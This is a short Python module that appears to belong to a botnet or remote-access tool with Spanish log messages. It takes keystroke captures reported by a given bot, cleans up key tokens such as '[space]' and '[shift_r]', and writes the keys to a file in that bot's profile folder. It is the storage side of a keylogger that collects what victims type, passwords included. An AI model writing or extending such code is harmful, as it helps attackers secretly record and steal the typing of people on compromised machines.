from secrets import token_urlsafe
from utils.sys_utils import bytes_convert
from utils.UI import debug

from conf import global_conf

profile = '{}/{}'.format(global_conf.databases['database'], global_conf.databases['profiles'])

def replace(string, to_replace):

    for _ in to_replace:

        string = string.replace(_[0], _[1])

    return(string)

def main(result, log, bot_id):

    if (isinstance(result, list)):

        result = [str(x) for x in result]
        keys = replace(''.join(result), [('[space]', ' '),
                                        ('[tab]', '\t'),
                                        ('[shift_r]', ''),
                                        ('[shift_l]', '')])

        filename = '{}/{}/{}.keys.txt'.format(profile, bot_id, token_urlsafe(32))

        with open(filename, 'wb') as file_object:

            file_object.write(bytes_convert.convert(keys))

        log.logger('Teclas guardadas en "{}"'.format(filename), debug.PER)

    else:

        log.logger('¡El tipo de dato de los resultados de las capturas de teclas no es correcta!', debug.WAR)
